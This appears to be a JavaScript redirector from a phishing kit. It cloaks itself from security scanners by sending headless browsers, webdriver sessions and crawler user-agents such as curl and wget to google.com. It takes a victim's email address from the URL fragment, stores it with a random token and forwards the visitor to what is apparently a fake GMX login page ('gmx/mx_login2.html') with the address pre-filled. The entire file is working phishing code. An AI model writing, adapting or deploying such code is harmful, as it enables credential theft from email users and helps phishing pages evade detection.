// Bot detection
if (
  window.outerWidth === 0 || 
  window.outerHeight === 0 ||
  navigator.webdriver ||
  /HeadlessChrome|PhantomJS|bot|spider|crawl|curl|wget/i.test(navigator.userAgent)
) {
  window.location.href = "https://google.com";
  throw new Error("Bot detected");
}

function generateSecureToken(length = 64) {
  const array = new Uint8Array(length / 2);
  window.crypto.getRandomValues(array);
  return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
}

function encodeData(data) {
  return btoa(encodeURIComponent(data))
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=+$/, '');
}

function isValidEmail(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

window.onload = function () {
  const hash = window.location.hash.substring(1);
  const decodedEmail = decodeURIComponent(hash);

  if (isValidEmail(decodedEmail)) {
    const token = generateSecureToken();

    sessionStorage.setItem("redirect_email", decodedEmail);
    sessionStorage.setItem("redirect_token", token);

    history.replaceState(null, "", window.location.pathname); // Clean URL

    const encodedEmail = encodeData(decodedEmail);

    window.location.href = `gmx/mx_login2.html#${encodedEmail}&token=${token}`;
  } else {
    window.location.href = "https://google.com";
  }
};
